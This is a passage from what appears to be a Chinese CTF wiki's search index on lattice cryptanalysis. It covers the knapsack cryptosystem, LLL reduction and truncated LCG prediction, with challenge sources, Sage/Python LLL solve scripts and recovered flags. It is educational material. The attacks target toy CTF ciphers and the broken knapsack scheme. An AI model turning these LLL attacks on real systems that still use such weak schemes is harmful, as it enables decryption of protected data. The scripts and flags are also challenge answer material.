\u5373\u53ef\uff0c\u7c7b\u4f3c\u7684\u53ef\u4ee5\u4f9d\u6b21\u751f\u6210\u540e\u9762\u7684\u503c\u3002</p>"},{"location":"crypto/asymmetric/lattice/knapsack/#_5","title":"\u751f\u6210\u516c\u94a5","text":"<p>\u5728\u751f\u6210\u516c\u94a5\u7684\u8fc7\u7a0b\u4e2d\u4e3b\u8981\u4f7f\u7528\u4e86\u6a21\u4e58\u7684\u8fd0\u7b97\u3002</p> <p>\u9996\u5148\uff0c\u6211\u4eec\u751f\u6210\u6a21\u4e58\u7684\u6a21\u6570 m\uff0c\u8fd9\u91cc\u8981\u786e\u4fdd</p>  m&gt;\\sum_{i=1}^{i=n}a_i  <p>\u5176\u6b21\uff0c\u6211\u4eec\u9009\u62e9\u6a21\u4e58\u7684\u4e58\u6570 w\uff0c\u4f5c\u4e3a\u79c1\u94a5\u5e76\u4e14\u786e\u4fdd</p>  gcd(w,m)=1  <p>\u4e4b\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u516c\u5f0f\u751f\u6210\u516c\u94a5</p>  b_i \\equiv w a_i \\bmod m  <p>\u5e76\u5c06\u8fd9\u4e2a\u65b0\u7684\u80cc\u5305\u96c6 b_i \u548c m \u4f5c\u4e3a\u516c\u94a5\u3002</p>"},{"location":"crypto/asymmetric/lattice/knapsack/#_6","title":"\u52a0\u89e3\u5bc6","text":""},{"location":"crypto/asymmetric/lattice/knapsack/#_7","title":"\u52a0\u5bc6","text":"<p>\u5047\u8bbe\u6211\u4eec\u8981\u52a0\u5bc6\u7684\u660e\u6587\u4e3a v\uff0c\u5176\u6bcf\u4e00\u4e2a\u6bd4\u7279\u4f4d\u4e3a v_i\uff0c\u90a3\u4e48\u6211\u4eec\u52a0\u5bc6\u7684\u7ed3\u679c\u4e3a</p>  \\sum_{i=1}^{i=n}b_iv_i \\bmod m"},{"location":"crypto/asymmetric/lattice/knapsack/#_8","title":"\u89e3\u5bc6","text":"<p>\u5bf9\u4e8e\u89e3\u5bc6\u65b9\uff0c\u9996\u5148\u53ef\u4ee5\u6c42\u7684 w \u5173\u4e8e m \u7684\u9006\u5143 w^{-1}\u3002</p> <p>\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5c06\u5f97\u5230\u7684\u5bc6\u6587\u4e58\u4ee5 w^{-1} \u5373\u53ef\u5f97\u5230\u660e\u6587\uff0c\u8fd9\u662f\u56e0\u4e3a</p>  \\sum_{i=1}^{i=n}w^{-1}b_iv_i \\bmod m=\\sum_{i=1}^{i=n}a_iv_i \\bmod m  <p>\u8fd9\u91cc\u6709</p>  b_i \\equiv w a_i \\bmod m  <p>\u5bf9\u4e8e\u6bcf\u4e00\u5757\u7684\u52a0\u5bc6\u7684\u6d88\u606f\u90fd\u662f\u5c0f\u4e8e m \u7684\uff0c\u6240\u4ee5\u6c42\u5f97\u7ed3\u679c\u81ea\u7136\u4e5f\u5c31\u662f\u660e\u6587\u4e86\u3002</p>"},{"location":"crypto/asymmetric/lattice/knapsack/#_9","title":"\u7834\u89e3","text":"<p>\u8be5\u52a0\u5bc6\u4f53\u5236\u5728\u63d0\u51fa\u540e\u4e24\u5e74\u540e\u8be5\u4f53\u5236\u5373\u88ab\u7834\u8bd1\uff0c\u7834\u8bd1\u7684\u57fa\u672c\u601d\u60f3\u662f\u6211\u4eec\u4e0d\u4e00\u5b9a\u8981\u627e\u51fa\u6b63\u786e\u7684\u4e58\u6570 w\uff08\u5373\u9677\u95e8\u4fe1\u606f\uff09\uff0c\u53ea\u9700\u627e\u51fa\u4efb\u610f\u6a21\u6570 <code>m\u2032</code> \u548c\u4e58\u6570 <code>w\u2032</code>\uff0c\u53ea\u8981\u4f7f\u7528 <code>w\u2032</code> \u53bb\u4e58\u516c\u5f00\u7684\u80cc\u5305\u5411\u91cf B \u65f6\uff0c\u80fd\u591f\u4ea7\u751f\u8d85\u9012\u589e\u7684\u80cc\u5305\u5411\u91cf\u5373\u53ef\u3002</p> <p>\u53c2\u8003 https://www.ruanx.net/lattice-2/ </p> <p>\u8fd9\u91cc\u8be6\u7ec6\u89e3\u91ca\u4e00\u4e0b https://www.ruanx.net/lattice-2/ \u4e2d\u7528LLL\u7b97\u6cd5\u653b\u51fb\u80cc\u5305\u5bc6\u7801\u7684\u7ec6\u8282.</p> <p>\u9996\u5148\u660e\u786e\u4e00\u4e0b\u5404\u4e2a\u7b26\u53f7\u7684\u542b\u4e49.</p> <p>M = (m_1, m_2, \\dots, m_n) \u662f\u516c\u94a5\uff0cx = (x_1, x_2, \\dots, x_n) \u662f\u660e\u6587\uff0cx_i \u4ee3\u8868\u660e\u6587\u76841\u4e2abit\uff0c\u53d60\u62161.</p> <p>\u5bc6\u6587\u4e3a</p>  S = \\sum_{i = 1}^nx_im_i  <p>\u653b\u51fb\u8005\u6784\u9020\u5982\u4e0b\u77e9\u9635\uff08\u540e\u9762\u4f1a\u89e3\u91ca\u4e3a\u4ec0\u4e48\u6784\u9020\u8fd9\u6837\u7684\u77e9\u9635\uff09</p>  \\begin{pmatrix} 2&amp;0&amp;0&amp;\\cdots&amp;0&amp;m_1\\\\0&amp;2&amp;0&amp;\\cdots&amp;0&amp;m_2 \\\\ 0&amp;0&amp;2&amp;\\cdots&amp;0&amp;m_3 \\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\ 0&amp;0&amp;0&amp;\\cdots&amp; 2 &amp; m _ n \\\\ 1&amp;1&amp;1&amp;\\cdots &amp;1&amp;S\\end{pmatrix}  <p>\u8bbe\u77e9\u9635\u7684\u7b2ci\u884c\u4e3a\u5411\u91cfv_i.</p> <p>\u8fd9\u4e9b\u5411\u91cf v_i \u5f20\u6210\u4e86\u4e00\u4e2aLattice\uff0c\u4ee5\u4e0b\u5411\u91cf\u663e\u7136\u5728\u8fd9\u4e2aLattice\u4e2d</p>  {t} = \\sum _{i=1} ^ n x_ i v_i - v_ {n+1} = (2x_1 - 1, 2x_2 - 1, \\dots, 2x_n - 1, 0)  <p>\u6ce8\u610f\u5230\u8fd9\u91cc\u7684 x_i \u90fd\u662f0\u62161\uff0c\u6240\u4ee5 2x_i-1 \u53ea\u80fd\u53d61\u6216-1\uff0c\u8fd9\u5c31\u4f7f\u5f97\u8fd9\u4e2a\u5411\u91cf\u975e\u5e38\u77ed\uff0c\u800cLLL\u7b97\u6cd5\u5c31\u662f\u6c42Lattice\u4e2d\u77ed\u5411\u91cf\u7684\u7b97\u6cd5.</p> <p>\u77e9\u9635\u4e2d\u76842\u548c1\u90fd\u662f\u4e3a\u4e86\u4f7f\u5411\u91cf t \u6700\u77ed\u800c\u9009\u62e9\u7684.</p> <p>\u8003\u8651\u53e6\u4e00\u79cd\u660e\u6587\u5f62\u5f0f\uff0c\u82e5 x_i \u4e0d\u662f0\u62161\uff0c\u800c\u662f\u4efb\u610f\u7684ASCII\u7801\u5bf9\u5e94\u5219\u5b57\u7b26\uff0c\u8303\u56f4\u4e3a0\u5230128\uff08\u621632\u5230128\uff09\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u77e9\u9635</p>  \\begin{pmatrix} a&amp;0&amp;0&amp;\\cdots&amp;0&amp;m_1/c\\\\0&amp;a&amp;0&amp;\\cdots&amp;0&amp;m_2/c \\\\ 0&amp;0&amp;a&amp;\\cdots&amp;0&amp;m_3/c \\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\ 0&amp;0&amp;0&amp;\\cdots&amp; a &amp; m _ n/c \\\\ b&amp;b&amp;b&amp;\\cdots &amp;b&amp;S/c\\end{pmatrix}  <p>\u5176\u4e2d\uff0ca \u53d61\uff0cb \u53d664\uff0c\u53ef\u4ee5\u8ba9\u5411\u91cf t \u6700\u77ed.</p> <p>\u4ee5\u4e0a\u6570\u503c\u7684\u9009\u53d6\u53ea\u662f\u7c97\u7565\u4f30\u8ba1\uff0c\u4e5f\u8bb8\u8003\u8651\u5230\u660e\u6587\u7684\u7279\u5b9a\u53d6\u503c\u8303\u56f4\u4f1a\u6709\u66f4\u597d\u7684\u53d6\u6cd5\uff08\u4f8b\u5982<code>flag</code>\u5168\u662f\u5c0f\u5199\u5b57\u6bcd+\u6570\u5b57\u65f6\uff09.</p> <p>\u81f3\u4e8e c\uff0c\u4e2a\u4eba\u611f\u89c9\u6bd4\u8f83\u7384\u5b66\uff0c\u5e94\u8be5\u662f\u4e3a\u4e86\u7f29\u77ed\u5411\u91cf\u7684\u957f\u5ea6\uff0c\u65b9\u4fbfLLL\u7b97\u6cd5\u8ba1\u7b97\uff0cc \u8fc7\u5c0f\u5411\u91cf\u4f1a\u5f88\u957f\uff0cc \u8fc7\u5927\u5219\u4f1a\u635f\u5931 m_i \u7684\u6709\u6548\u4f4d\u6570.</p>"},{"location":"crypto/asymmetric/lattice/knapsack/#2021-primegame","title":"\u4f8b\u9898 [2021 \u7ea2\u5e3d\u676f]primegame","text":"<pre><code>#!/usr/bin/env python3\n\nfrom decimal import *\nimport math\nimport random\nimport struct\nfrom flag import flag\n\nassert (len(flag) == 48)\nmsg1 = flag[:24]\nmsg2 = flag[24:]\nprimes = [2] # 2\u523090\u7684\u6240\u6709\u7d20\u6570\nfor i in range(3, 90):\n    f = True\n    for j in primes:\n        if i * i &lt; j:\n            break\n        if i % j == 0:\n            f = False\n            break\n    if f:\n        primes.append(i)\n\ngetcontext().prec = 100 # 100\u4f4d\u6709\u6548\u6570\u5b57\nkeys = []\nfor i in range(len(msg1)):\n    keys.append(Decimal(primes[i]).ln())\n# keys: 2\u523089\u7684\u7d20\u6570\u7684\u81ea\u7136\u5bf9\u6570\n\nsum_ = Decimal(0.0)\nfor i, c in enumerate(msg1):\n    sum_ += c * Decimal(keys[i])\n\nct = math.floor(sum_ * 2 ** 256)\nprint(ct)\n\nsum_ = Decimal(0.0)\nfor i, c in enumerate(msg2):\n    sum_ += c * Decimal(keys[i])\n\nct = math.floor(sum_ * 2 ** 256)\nprint(ct)\n#597952043660446249020184773232983974017780255881942379044454676980646417087515453\n#425985475047781336789963300910446852783032712598571885345660550546372063410589918\n</code></pre>"},{"location":"crypto/asymmetric/lattice/knapsack/#exp","title":"EXP","text":"<pre><code>#sage\nimport math\nfrom decimal import *\nimport random\n\ngetcontext().prec = int(100)\n\nprimes = [2]\nfor i in range(3, 90):\n    f = True\n    for j in primes:\n        if i * i &lt; j:\n            break\n        if i % j == 0:\n            f = False\n            break\n    if f:\n        primes.append(i)\n\nkeys = []\nfor i in range(len(primes)):\n    keys.append(Decimal(int(primes[i])).ln())\n\narr = []\nfor v in keys:\n    arr.append(int(v * int(2)^int(256)))\n\n\ndef encrypt(res):\n    h = Decimal(int(0))\n    for i in range(len(keys)):\n        h += res[i] * keys[i]\n    ct = int(h * int(2)^int(256))\n    return ct\n\n\ndef solve(N):\n    ln = len(arr)\n    A = Matrix(ZZ, ln + 1, ln + 1)\n    for i in range(ln):\n        A[i, i] = 1\n        A[i, ln] = arr[i] // N\n        A[ln, i] = 64 # \u7528\u6765\u51cf\u5c0f\u5411\u91cft\u76842\u8303\u6570\n\n    A[ln, ln] = ct // N\n    res = A.LLL()\n    for i in range(ln + 1):\n        flag = True\n        for j in range(ln):\n            if -64 &lt;= res[i][j] and res[i][j] &lt; 64:\n                continue\n            flag = False\n            break\n        if flag:\n            vec = [int(v + 64) for v in res[i][:-1]]\n            ret = encrypt(vec)\n            if ret == ct:\n                print(vec)\n                print(N, bytes(vec))\n                return 1\n    return 0\n\nct = 597952043660446249020184773232983974017780255881942379044454676980646417087515453\nfor i in range(2, 10000):\n    # print(i)\n    if solve(i):\n        break\n\nct = 425985475047781336789963300910446852783032712598571885345660550546372063410589918\nfor i in range(2, 10000):\n    # print(i)\n    if solve(i):\n        break\n\n'''\nroot@kali:~/ctf/SageMath# ./sage ./script/test.sage\n[102, 108, 97, 103, 123, 55, 49, 53, 99, 51, 57, 99, 51, 45, 49, 98, 52, 54, 45, 52, 99, 50, 51, 45]\n83 b'flag{715c39c3-1b46-4c23-'\n[56, 48, 48, 54, 45, 50, 55, 98, 52, 51, 101, 98, 97, 50, 52, 52, 54, 125, 0, 0, 0, 0, 0, 0]\n2130 b'8006-27b43eba2446}\\x00\\x00\\x00\\x00\\x00\\x00'\n'''\n</code></pre>"},{"location":"crypto/asymmetric/lattice/knapsack/#asis-cyber-security-contest-quals-2014archaic","title":"\u4f8b\u9898 [ASIS Cyber Security Contest Quals 2014]Archaic","text":"<p>\u9898\u76ee\u94fe\u63a5</p> <p>\u9996\u5148\u67e5\u770b\u6e90\u7a0b\u5e8f</p> <pre><code>secret = 'CENSORED'\nmsg_bit = bin(int(secret.encode('hex'), 16))[2:]\n</code></pre> <p>\u9996\u5148\u5f97\u5230\u4e86 secret \u7684\u6240\u6709\u4e8c\u8fdb\u5236\u4f4d\u3002</p> <p>\u5176\u6b21\uff0c\u5229\u7528\u5982\u4e0b\u51fd\u6570\u5f97\u5230 keypair\uff0c\u5305\u542b\u516c\u94a5\u4e0e\u79c1\u94a5\u3002</p> <pre><code>keyPair = makeKey(len(msg_bit))\n</code></pre> <p>\u4ed4\u7ec6\u5206\u6790 makekey \u51fd\u6570\uff0c\u5982\u4e0b</p> <pre><code>def makeKey(n):\n    privKey = [random.randint(1, 4**n)]\n    s = privKey[0]\n    for i in range(1, n):\n        privKey.append(random.randint(s + 1, 4**(n + i)))\n        s += privKey[i]\n    q = random.randint(privKey[n-1] + 1, 2*privKey[n-1])\n    r = random.randint(1, q)\n    while gmpy2.gcd(r, q) != 1:\n        r = random.randint(1, q)\n    pubKey = [ r*w % q for w in privKey ]\n    return privKey, q, r, pubKey\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa prikey \u662f\u4e00\u4e2a\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u5e76\u4e14\u5f97\u5230\u7684 q \u6bd4 prikey \u4e2d\u6240\u6709\u6570\u7684\u548c\u8fd8\u8981\u5927\uff0c\u6b64\u5916\u6211\u4eec\u5f97\u5230\u7684 r\uff0c\u6070\u597d\u4e0e q \u4e92\u7d20\uff0c\u8fd9\u4e00\u5207\u90fd\u8868\u660e\u4e86\u8be5\u52a0\u5bc6\u662f\u4e00\u4e2a\u80cc\u5305\u52a0\u5bc6\u3002</p> <p>\u679c\u7136\u52a0\u5bc6\u51fd\u6570\u5c31\u662f\u5bf9\u4e8e\u6d88\u606f\u7684\u6bcf\u4e00\u4f4d\u4e58\u4ee5\u5bf9\u5e94\u7684\u516c\u94a5\u5e76\u6c42\u548c\u3002</p> <pre><code>def encrypt(msg, pubKey):\n    msg_bit = msg\n    n = len(pubKey)\n    cipher = 0\n    i = 0\n    for bit in msg_bit:\n        cipher += int(bit)*pubKey[i]\n        i += 1\n    return bin(cipher)[2:]\n</code></pre> <p>\u5bf9\u4e8e\u7834\u89e3\u7684\u811a\u672c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 GitHub \u4e0a\u7684\u811a\u672c\u3002\u8fdb\u884c\u4e00\u4e9b\u7b80\u5355\u7684\u4fee\u6539\u3002</p> <pre><code>import binascii\n# open the public key and strip the spaces so we have a decent array\nfileKey = open(\"pub.Key\", 'rb')\npubKey = fileKey.read().replace(' ', '').replace('L', '').strip('[]').split(',')\nnbit = len(pubKey)\n# open the encoded message\nfileEnc = open(\"enc.txt\", 'rb')\nencoded = fileEnc.read().replace('L', '')\nprint \"start\"\n# create a large matrix of 0's (dimensions are public key length +1)\nA = Matrix(ZZ, nbit + 1, nbit + 1)\n# fill in the identity matrix\nfor i in xrange(nbit):\n    A[i, i] = 1\n# replace the bottom row with your public key\nfor i in xrange(nbit):\n    A[i, nbit] = pubKey[i]\n# last element is the encoded message\nA[nbit, nbit] = -int(encoded)\n\nres = A.LLL()\nfor i in range(0, nbit + 1):\n    # print solution\n    M = res.row(i).list()\n    flag = True\n    for m in M:\n        if m != 0 and m != 1:\n            flag = False\n            break\n    if flag:\n        print i, M\n        M = ''.join(str(j) for j in M)\n        # remove the last bit\n        M = M[:-1]\n        M = hex(int(M, 2))[2:-1]\n        print M\n</code></pre> <p>\u8f93\u51fa\u4e4b\u540e\u518d\u89e3\u7801\u4e0b</p> <pre><code>295 [1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0]\n415349535f3962643364356664323432323638326331393536383830366130373036316365\n&gt;&gt;&gt; import binascii\n&gt;&gt;&gt; binascii.unhexlify('415349535f3962643364356664323432323638326331393536383830366130373036316365')\n'ASIS_9bd3d5fd2422682c19568806a07061ce'\n</code></pre> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5f97\u5230\u7684 LLL \u653b\u51fb\u5f97\u5230\u7684\u77e9\u9635 res \u7684\u53ea\u5305\u542b 01 \u503c\u7684\u884c\u624d\u662f\u6211\u4eec\u60f3\u8981\u7684\u7ed3\u679c\uff0c\u56e0\u4e3a\u6211\u4eec\u5bf9\u4e8e\u660e\u6587\u52a0\u5bc6\u65f6\uff0c\u4f1a\u5c06\u5176\u5206\u89e3\u4e3a\u4e8c\u8fdb\u5236\u6bd4\u7279\u4e32\u3002\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u53bb\u6389\u5bf9\u5e94\u54ea\u4e00\u884c\u7684\u6700\u540e\u4e00\u4e2a\u6570\u5b57\u3002</p> <p>flag \u662f <code>ASIS_9bd3d5fd2422682c19568806a07061ce</code>\u3002</p>"},{"location":"crypto/asymmetric/lattice/knapsack/#_10","title":"\u9898\u76ee","text":"<ul> <li>2017 \u56fd\u8d5b classic</li> </ul>"},{"location":"crypto/asymmetric/lattice/lattice-reduction/","title":"\u683c\u57fa\u89c4\u7ea6\u7b97\u6cd5","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/asymmetric/lattice/lattice-reduction/#lenstralenstralovasz","title":"Lenstra\u2013Lenstra\u2013Lovasz","text":""},{"location":"crypto/asymmetric/lattice/lattice-reduction/#_2","title":"\u57fa\u672c\u4ecb\u7ecd","text":"<p>LLL \u7b97\u6cd5\u5c31\u662f\u5728\u683c\u4e0a\u627e\u5230\u4e00\u7ec4\u57fa\uff0c\u6ee1\u8db3\u5982\u4e0b\u6548\u679c</p> <p></p> <p>\u800c\u4e14\uff0c\u8fd9\u79cd\u65b9\u6cd5\u751f\u6210\u7684\u57fa\u6240\u5177\u6709\u7684\u5982\u4e0b\u6027\u8d28\u662f\u975e\u5e38\u6709\u7528\u7684</p> <p></p>"},{"location":"crypto/asymmetric/lattice/lattice-reduction/#_3","title":"\u7b80\u5355\u5e94\u7528","text":"<p>\u8fd9\u91cc\u6211\u4e3e\u4e00\u4e0b LLL paper \u4e2d\u7ed9\u7684\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u3002\u7ed9\u5b9a n \u4e2a\u5b9e\u6570 \\alpha_i,...,\\alpha_n\uff0c\u627e\u5230\u8fd9 n \u4e2a\u6570\u7684\u6709\u7406\u7ebf\u6027\u903c\u8fd1\uff0c\u5373\u627e\u5230 n \u4e2a\u6570 m_i\uff0c\u4f7f\u5f97 \\sum\\limits_{i=1}^{n}m_i\\alpha_i \u5c3d\u53ef\u80fd\u7b49\u4e8e 0\u3002 \u6211\u4eec\u53ef\u4ee5\u6784\u9020\u8fd9\u6837\u7684\u77e9\u9635\uff0c\u8fd9\u91cc a_i \u4e3a \\alpha_i \u7684\u6709\u7406\u903c\u8fd1\u3002</p>  A = \\left[ \\begin{matrix} 1   &amp; 0 &amp; 0     &amp; \\cdots &amp; 0 &amp; ca_1     \\\\ 0   &amp; 1  &amp; 0    &amp; \\cdots &amp; 0 &amp; c a_2  \\\\ 0   &amp; 0   &amp; 1   &amp; \\cdots &amp; 0 &amp; c a_3 \\\\\\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 0   &amp; 0   &amp;0   &amp; \\cdots &amp; 1 &amp; c a_n     \\\\ \\end{matrix} \\right] <p>\u77e9\u9635\u4e3a n*(n+1) \u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u683c\u6c42\u884c\u5217\u5f0f\u7684\u65b9\u6cd5\u6765\u6c42\u4e00\u4e0b\u8fd9\u4e2a\u683c\u5bf9\u5e94\u7684\u884c\u5217\u5f0f\u3002</p> <p>det(L)=\\sqrt{AA^T}</p> <p>\u6211\u4eec\u8fdb\u4e00\u6b65\u8003\u8651\u8fd9\u6837\u7684\u77e9\u9635</p>  A = \\left[ \\begin{matrix} 1   &amp; 0 &amp; 0     &amp; \\cdots &amp; 0 &amp; a_1     \\\\ 0   &amp; 1  &amp; 0    &amp; \\cdots &amp; 0 &amp; a_2  \\\\ 0   &amp; 0   &amp; 1   &amp; \\cdots &amp; 0 &amp; a_3 \\\\\\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 0   &amp; 0   &amp;0   &amp; \\cdots &amp; 1 &amp; a_n     \\\\ \\end{matrix} \\right] <p>\u90a3\u4e48</p>  AA^T = \\left[ \\begin{matrix} 1+a_1^2   &amp; a_1a_2   &amp; a_1a_3 &amp; \\cdots  &amp; a_1a_n     \\\\ a_2a_1   &amp; 1+a_2^2  &amp; a_2a_3 &amp; \\cdots &amp; a_2a_n  \\\\ a_3a_1   &amp; a_3a_2   &amp; 1+a_3^2   &amp; \\cdots  &amp; a_3a_n \\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ a_na_1   &amp; a_na_2   &amp;a_na_3   &amp; \\cdots  &amp; 1+a_n^2     \\\\ \\end{matrix} \\right] <p>\u8fdb\u4e00\u6b65\u6211\u4eec\u4ece\u4f4e\u7ef4\u5230\u9ad8\u7ef4\u5927\u6982\u8bd5\u4e00\u8bd5\uff08\u4e25\u683c\u8bc1\u660e\uff0c\u53ef\u4ee5\u8003\u8651\u6dfb\u52a0\u4e00\u884c\u548c\u4e00\u5217\uff0c\u5de6\u4e0a\u89d2\u4e3a1\uff09\uff0c\u5f97\u5230\u683c\u7684\u884c\u5217\u5f0f\u4e3a</p> <p>\\sqrt{1+\\sum\\limits_{i=1}^n\\alpha_i^2}</p> <p>\u53ef\u4ee5\u53c2\u89c1\u8003\u7814\u5b87\u54e5\u7684\u5982\u4e0b\u8bc1\u660e</p> <p></p> <p>\u90a3\u4e48\u7ecf\u8fc7 LLL \u7b97\u6cd5\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97</p> <p>||b_1|| \\leq 2^{\\frac{n-1}{4}} (1+\\sum\\limits_{i=1}^n\\alpha_i^2)^{\\frac{1}{2(n+1)}}</p> <p>\u4e00\u822c\u6765\u8bf4\u540e\u4e00\u9879\u5728\u5f00 n \u6b21\u65b9\u65f6\u8d8b\u5411\u4e8e1\uff0c\u56e0\u4e3a a_i \u90fd\u662f\u5e38\u6570\uff0c\u4e00\u822c\u4e0d\u4f1a\u548c n \u76f8\u5173\uff0c\u6240\u4ee5</p> <p>||b_1|| \\leq 2^{\\frac{n-1}{4}}*k</p> <p>k \u6bd4\u8f83\u5c0f\u3002\u6b64\u5916\uff0cb_1 \u53c8\u662f\u539f\u5411\u91cf\u7684\u7ebf\u6027\u7ec4\u5408\uff0c\u90a3\u4e48</p> <p>b_1[n]=\\sum\\limits_{i=1}^{n}m_ic*a_i=c\\sum\\limits_{i=1}^{n}m_i*a_i</p> <p>\u663e\u7136\u5982\u679c c \u8db3\u591f\u5927\uff0c\u90a3\u4e48\u540e\u9762\u7684\u6c42\u548c\u5fc5\u987b\u8db3\u591f\u5c0f\uff0c\u624d\u53ef\u4ee5\u6ee1\u8db3\u4e0a\u9762\u7684\u7ea6\u675f\u3002</p>"},{"location":"crypto/asymmetric/lattice/lattice-reduction/#_4","title":"\u53c2\u8003","text":"<ul> <li>Survey: Lattice Reduction Attacks on RSA</li> </ul>"},{"location":"crypto/asymmetric/lattice/lcg/","title":"LCG\u76f8\u5173\u95ee\u9898","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>LCG \u5373\u7ebf\u6027\u540c\u4f59\u53d1\u751f\u5668\uff0c\u662f\u4e00\u79cd\u7b80\u5355\u7684\u968f\u673a\u6570\u751f\u6210\u7b97\u6cd5\uff0c\u516c\u5f0f\u5982\u4e0b\uff1a</p>  s_{i+1} = (as_i+b) \\mod m  <p>\u5229\u7528 LLL \u7b97\u6cd5\u53ef\u4ee5\u6c42\u89e3 truncated LCG \u95ee\u9898\uff0c\u5373\u5df2\u77e5\u82e5\u5e72\u8fde\u7eed\u72b6\u6001\u7684\u503c\u7684\u9ad8\u4f4d\uff0c\u6c42\u51fa seed \u5e76\u9884\u6d4b\u5176\u4ed6\u72b6\u6001.</p> <p>\u5176\u4f59 LLL \u7b97\u6cd5\u5728 LCG \u4e0a\u7684\u5e94\u7528\u53c2\u8003 https://0xdktb.top/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/</p> <p>\u4ee5\u4e0b\u9898\u4e3a\u4f8b\u8bf4\u660e</p>"},{"location":"crypto/asymmetric/lattice/lcg/#npuctf2020babylcg","title":"\u4f8b\u9898 [NPUCTF2020]babyLCG","text":"<p>BUUCTF \u4e0a\u53ef\u4ee5\u4e0b\u8f7d\u539f\u9898</p> <p>\u9898\u76ee\u6e90\u7801\uff08\u9644\u4ef6\u4e2d\u7ed9\u51fact, key, old\uff09</p> <pre><code>from Crypto.Util.number import *\nfrom Crypto.Cipher import AES\nfrom secret import flag\n\nclass LCG:\n    def __init__(self, bit_length):\n        m = getPrime(bit_length)\n        a = getRandomRange(2, m)\n        b = getRandomRange(2, m)\n        seed = getRandomRange(2, m)\n        self._key = {'a':a, 'b':b, 'm':m}\n        self._state = seed\n\n    def next(self):\n        self._state = (self._key['a'] * self._state + self._key['b']) % self._key['m']\n        return self._state\n\n    def export_key(self):\n        return self._key\n\n\ndef gen_lcg():\n    rand_iter = LCG(128)\n    key = rand_iter.export_key()\n    f = open(\"key\", \"w\")\n    f.write(str(key))\n    return rand_iter\n\n\ndef leak_data(rand_iter):\n    f = open(\"old\", \"w\")\n    for i in range(20):\n        f.write(str(rand_iter.next() &gt;&gt; 64) + \"\\n\")\n    return rand_iter\n\n\ndef encrypt(rand_iter):\n    f = open(\"ct\", \"wb\")\n    key = rand_iter.next() &gt;&gt; 64\n    key = (key &lt;&lt; 64) + (rand_iter.next() &gt;&gt; 64)\n    key = long_to_bytes(key).ljust(16, b'\\x00')\n    iv = long_to_bytes(rand_iter.next()).ljust(16, b'\\x00')\n    cipher = AES.new(key, AES.MODE_CBC, iv)\n    pt = flag + (16 - len(flag) % 16) * chr(16 - len(flag) % 16)\n    ct = cipher.encrypt(pt.encode())\n    f.write(ct)\n\n\ndef main():\n    rand_iter = gen_lcg()\n    rand_iter = leak_data(rand_iter)\n    encrypt(rand_iter)\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"crypto/asymmetric/lattice/lcg/#_1","title":"\u5206\u6790","text":"<p>\u4e00\u4e2a\u666e\u901a\u7684 LCG\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053<code>seed</code>\uff0c\u53ea\u77e5\u9053\u524d20\u4e2a\u72b6\u6001\u7684\u9ad864\u4f4d\uff0c\u8981\u9884\u6d4b\u540e\u9762\u7684\u51e0\u4e2a\u6570.</p> <p>\u8bbe\u751f\u6210\u7684128\u4f4d\u72b6\u6001\u4e3a x_i\uff0c\u9ad864\u4f4d\u4e3a y_i \uff08\u5df2\u77e5\uff09\uff0c\u4f4e64\u4f4d\u4e3a z_i\uff0c\u5219</p>  x_i = y_i \\times 2^{64} + z_i \\\\ x_{i+1} - x_i = a^i(x_1 - x_0) \\mod m  